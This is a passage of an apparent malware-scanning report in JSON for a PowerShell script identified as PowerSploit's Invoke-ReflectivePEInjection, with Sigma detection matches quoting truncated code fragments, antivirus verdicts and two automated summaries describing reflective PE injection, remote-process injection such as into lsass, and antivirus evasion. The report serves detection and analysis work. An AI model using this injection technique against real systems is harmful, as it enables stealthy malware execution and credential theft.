                                                                                                 "values":  "@{ScriptBlockText=neField(\u0027SizeOfStackCommit\u0027, [UInt64], \u0027Public\u0027)).SetOffset(80) | Out-Null\r\n\t\t($TypeBuilder.DefineField(\u0027SizeOfHeapReserve\u0027, [UInt64], \u0027Public\u0027)).SetOffset(88) | Out-Null\r\n\t\t($TypeBuilder.DefineField(\u0027SizeOfHeapCommit\u0027, [UInt64], \u0027Public\u0027)).SetOffset(96) | Out-Null\r\n\t\t($TypeBuilder.DefineField(\u0027LoaderFlags\u0027, [UInt32], \u0027Public\u0027)).SetOffset(104) | Out-Null\r\n\t\t($TypeBuilder.DefineField(\u0027NumberOfRvaAndSizes\u0027, [UInt32], \u0027Public\u0027)).SetOffset(108) | Out-Null\r\n\t\t($TypeBuilder.DefineField(\u0027ExportTable\u0027,  [TRUNCATED]; Path=C:\\Users\\Bruno\\Desktop\\payload_1.ps1; ScriptBlockId=b4a5b9bb-697f-4d95-ab00-557ec44309d2; MessageTotal=8; MessageNumber=2; EventID=4104}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "low",
                                                                       "rule_id":  "b0d225f3239543a37159ba2855ee1e7972c6bff3c83ce7aed9056599f6ee6314",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious Process Discovery With Get-Process",
                                                                       "rule_description":  "Get the processes that are running on the local computer.",
                                                                       "rule_author":  "frack113",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=support ASLR. Cannot load a non-ASLR PE in to a remote process\" -ErrorAction Stop\r\n        }\r\n\r\n\t\t$PEHandle = [IntPtr]::Zero\t\t\t\t#This is where the PE is allocated in PowerShell\r\n\t\t$EffectivePEHandle = [IntPtr]::Zero\t\t#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.\r\n\t\tif ($RemoteLoading -eq $true)\r\n\t\t{\r\n\t\t\t#Allocate space in the remote process, and also allocate spa [TRUNCATED]; Path=C:\\Users\\azure\\Downloads\\payload_1.ps1; ScriptBlockId=79897f63-e2e5-4e44-a14c-990cd599a27d; MessageTotal=9; MessageNumber=8; EventID=4104}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=tr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))\r\n\t\t\t\t$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])\r\n\t\t\t\t$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))\r\n\t\t\t\t$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStr [TRUNCATED]; MessageTotal=8; ScriptBlockId=b4a5b9bb-697f-4d95-ab00-557ec44309d2; Path=C:\\Users\\Bruno\\Desktop\\payload_1.ps1; EventID=4104; MessageNumber=7}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText= it around just incase it is needed in the future.\r\n\t\t#If the script isn\u0027t running in the same Windows logon session as the target, get SeDebugPrivilege\r\n#\t\tif ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)\r\n#\t\t{\r\n#\t\t\tWrite-Verbose \"Getting SeDebugPrivilege\"\r\n#\t\t\tEnable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants\r\n#\t\t}\r\n\r\n\t\tif (($ProcId -ne $null) -and ($ProcId -ne 0))\r\n\t\t{\r\n\t\t\t$RemoteProcHandle = $Win32Func [TRUNCATED]; Path=C:\\Users\\Bruno\\Desktop\\payload_1.ps1; ScriptBlockId=b4a5b9bb-697f-4d95-ab00-557ec44309d2; MessageTotal=8; MessageNumber=8; EventID=4104}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=tr]::Zero) | Out-Null\r\n\r\n\r\n\t\t$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)\r\n\t\tif ($Success -eq $false)\r\n\t\t{\r\n\t\t\tWrite-Warning \"Unable to call VirtualFree on the PE\u0027s memory. Continuing anyways.\" -WarningAction Continue\r\n\t\t}\r\n\t}\r\n\r\n\r\n\tFunction Main\r\n\t{\r\n\t\t$Win32Functions = Get-Win32Functions\r\n\t\t$Win32Types = Get-Win32Types\r\n\t\t$Win32Constants =  Get-Win32Constants\r\n\r\n\t\t$RemoteProcHandle = [IntPtr]::Zero\r\n\r\n\t\t#If a remote process to inject in to is [TRUNCATED]; MessageTotal=13; ScriptBlockId=9f2fbb51-ea1e-4f89-b8fc-5166ac608394; Path=C:\\Users\\Bruno\\Desktop\\payload_1.ps1; EventID=4104; MessageNumber=13}"
                                                                                             }
                                                                                         ]
                                                                   }
                                                               ],
                                    "available_tools":  [
                                                            "sigcheck"
                                                        ],
                                    "magika":  "POWERSHELL",
                                    "tlsh":  "T1C4D3F819BF4D065807830875F976DCDD1B3D80B458A98850F56CC626BFE32AE813FBA6",
                                    "sigma_analysis_summary":  {
                                                                   "Sigma Integrated Rule Set (GitHub)":  {
                                                                                                              "critical":  0,
                                                                                                              "high":  2,
                                                                                                              "medium":  4,
                                                                                                              "low":  1
                                                                                                          }
                                                               },
                                    "exiftool":  {
                                                     "MIMEType":  "text/plain",
                                                     "FileType":  "TXT",
                                                     "WordCount":  "11791",
                                                     "LineCount":  "2949",
                                                     "MIMEEncoding":  "us-ascii",
                                                     "FileTypeExtension":  "txt",
                                                     "Newlines":  "Unix LF"
                                                 },
                                    "sha256":  "fb0f7c35a58a02473f26aabea4f682e2e483db84b606db2eca36aa6c7e7d9cf8",
                                    "times_submitted":  1,
                                    "reputation":  -2,
                                    "type_description":  "Powershell",
                                    "downloadable":  true,
                                    "unique_sources":  1,
                                    "last_analysis_stats":  {
                                                                "malicious":  40,
                                                                "suspicious":  0,
                                                                "undetected":  23,
                                                                "harmless":  0,
                                                                "timeout":  0,
                                                                "confirmed-timeout":  0,
                                                                "failure":  0,
                                                                "type-unsupported":  14
                                                            },
                                    "ssdeep":  "1536:UPHY8HYYSxRHgCFsfHPv6+41WoLZFIaBfYyHnpC2kYmOtLUp6EBmmbYuyCgCFsf3:U5E",
                                    "popular_threat_classification":  {
                                                                          "popular_threat_category":  [
                                                                                                          {
                                                                                                              "count":  16,
                                                                                                              "value":  "trojan"
                                                                                                          },
                                                                                                          {
                                                                                                              "count":  9,
                                                                                                              "value":  "hacktool"
                                                                                                          }
                                                                                                      ],
                                                                          "popular_threat_name":  [
                                                                                                      {
                                                                                                          "count":  13,
                                                                                                          "value":  "powersploit"
                                                                                                      },
                                                                                                      {
                                                                                                          "count":  7,
                                                                                                          "value":  "powershell"
                                                                                                      },
                                                                                                      {
                                                                                                          "count":  3,
                                                                                                          "value":  "mimikatz"
                                                                                                      }
                                                                                                  ],
                                                                          "suggested_threat_label":  "trojan.powersploit/powershell"
                                                                      },
                                    "md5":  "65d002a30d514d6f6b290360c44493c5",
                                    "crowdsourced_ai_results":  [
                                                                    {
                                                                        "source":  "uma",
                                                                        "verdict":  "unknown",
                                                                        "category":  "code_insight",
                                                                        "analysis":  "The provided PowerShell code implements a function called `Invoke-ReflectivePEInjection`, which is designed to perform reflective DLL and EXE injection into the memory of the PowerShell process or a specified remote process. The code contains detailed comments that describe its functionality, but these comments may serve to obfuscate its true intent.\n\nThe script allows for the loading of a Portable Executable (PE) file (either a DLL or an EXE) into memory without writing it to disk, which is a common technique used by malware to evade detection by antivirus software. The code includes options to load the PE from a local file, a URL, or a byte array, and it can also inject the PE into a remote process, such as `lsass`, which is a critical system process. \n\nKey features of the code include:\n- Reflective Loading: The ability to load a PE file into memory and execute it without leaving traces on the filesystem.\n- Remote Process Injection: The capability to inject a DLL into a remote process, which can be used to execute malicious payloads in the context of that process.\n- Functionality to Bypass Security: The script mentions the ability to encrypt the byte array of the PE file to bypass antivirus detection, indicating a clear intent to evade security measures.\n- Manipulation of Process Memory: The use of Windows API calls to manipulate memory directly, including functions like `VirtualAlloc`, `WriteProcessMemory`, and `CreateRemoteThread`, which are commonly associated with malicious activities.\n\nOverall, the code is designed for stealthy execution of potentially harmful code, making it highly suspicious and indicative of malicious intent.\n\n## Conclusion:\nThe analysis of the PowerShell code reveals that it is designed for malicious purposes, specifically for reflective DLL and EXE injection, which is a technique often used in malware to execute code without detection. The ability to inject into critical system processes further emphasizes its potential for harm.",
                                                                        "id":  "fb0f7c35a58a02473f26aabea4f682e2e483db84b606db2eca36aa6c7e7d9cf8-file-uma"
                                                                    },
                                                                    {
                                                                        "source":  "palm",
                                                                        "verdict":  "",
                                                                        "category":  "code_insight",
                                                                        "analysis":  "The script `Invoke-ReflectivePEInjection` is a PowerShell function designed to load and execute Windows Portable Executable (PE) files (DLLs or EXEs) either in the current PowerShell process or in a remote process. It supports loading PEs from a local file path, a URL, or a byte array.\n\nThe script begins by defining several parameters, including the PE file source (`PEPath`, `PEUrl`, or `PEBytes`), target computer (`ComputerName`), function return type (`FuncReturnType`), executable arguments (`ExeArgs`), process identifier (`ProcId`) or process name (`ProcName`) for remote injection, and a flag to force ASLR (`ForceASLR`).\n\nThe script then defines a remote script block (`$RemoteScriptBlock`) which contains the core logic for PE injection. Within the remote script block, it defines several helper functions including:\n\n- `Get-Win32Types`: Defines various Win32 API structures and enums required for PE parsing and memory manipulation using dynamic assembly.\n- `Get-Win32Constants`: Defines various Win32 API constants.\n- `Get-Win32Functions`: Retrieves addresses of Win32 API functions from system DLLs (kernel32.dll, msvcrt.dll, Advapi32.dll, Ntdll.dll) and creates delegates for them.\n- `Sub-SignedIntAsUnsigned`, `Add-SignedIntAsUnsigned`, `Compare-Val1GreaterThanVal2AsUInt`, `Convert-UIntToInt`, `Get-Hex`: Helper functions for performing arithmetic and conversions on signed integers as if they were unsigned, and also formatting to hexadecimal.\n- `Test-MemoryRangeValid`: Validates if a specified memory range is within allocated bounds.\n- `Write-BytesToMemory`: Writes a byte array to a specified memory address.\n- `Get-DelegateType`: Creates a delegate type for a given method signature (parameters and return type).\n- `Get-ProcAddress`: Retrieves the address of an exported function from a loaded module.\n- `Enable-SeDebugPrivilege`: Attempts to enable the SeDebugPrivilege for the current thread, which may be required for debugging other processes.\n- `Create-RemoteThread`: Creates a thread in a remote process, starting at a specified address.\n- `Get-ImageNtHeaders`: Retrieves the IMAGE_NT_HEADERS from a PE file in memory.\n- `Get-PEBasicInfo`: Extracts basic information (architecture, image base, size of image, etc.) from a PE file.\n- `Get-PEDetailedInfo`: Retrieves detailed information about a PE file loaded in memory, including section headers.\n- `Import-DllInRemoteProcess`: Loads a DLL into a remote process using `LoadLibraryA`.\n- `Get-RemoteProcAddress`: Gets address of an exported function from DLL loaded in a remote process using `GetProcAddress`.\n- `Copy-Sections`: Copies section data from the PE file to allocated memory.\n- `Update-MemoryAddresses`: Updates memory addresses within the PE file based on the actual load address, handling relocations.\n- `Import-DllImports`: Resolves and imports DLL dependencies for the loaded PE file.\n- `Get-VirtualProtectValue`: Returns the appropriate memory protection flag based on section characteristics\n- `Update-MemoryProtectionFlags`: Updates the memory protection flags for the PE file\u0027s sections.\n- `Update-ExeFunctions`: Overwrites GetCommandLine and ExitThread functions, which are needed to reflectively load an EXE.\n- `Copy-ArrayOfMemAddresses`: Copies an array of memory addresses.\n- `Get-MemoryProcAddress`: Retrieves a function address from memory.\n- `Invoke-MemoryLoadLibrary`: Loads a PE file into memory, performs relocations, and imports dependencies.\n- `Invoke-MemoryFreeLibrary`: Frees the memory allocated for the PE file and its dependencies.\n\nThe `Main` function within the remote script block determines whether to inject into a remote process or load the PE in the current process. It calls `Invoke-MemoryLoadLibrary` to load the PE, and if it\u0027s a DLL, it calls a specified function within the DLL. Finally, it frees the allocated memory.\n\nThe outer `Main` function handles loading the PE file from the specified source (file, URL, or byte array), performs a basic check to ensure it\u0027s a valid PE file (\"MZ\" header), removes the \"MZ\" header from the byte array, and then calls the remote script block via `Invoke-Command` to perform the actual PE injection, either locally or on a remote computer. It also adds a \"program name\" to the ExeArgs\n\nThe script contains functionality to download a PE file from a URL using `$WebClient.DownloadData($PEUrl)`. This retrieves the file and stores its content as a byte array in the `$PEBytes` variable.",
                                                                        "id":  "fb0f7c35a58a02473f26aabea4f682e2e483db84b606db2eca36aa6c7e7d9cf8-file-palm"
                                                                    }
                                                                ]
                                }
             }
}
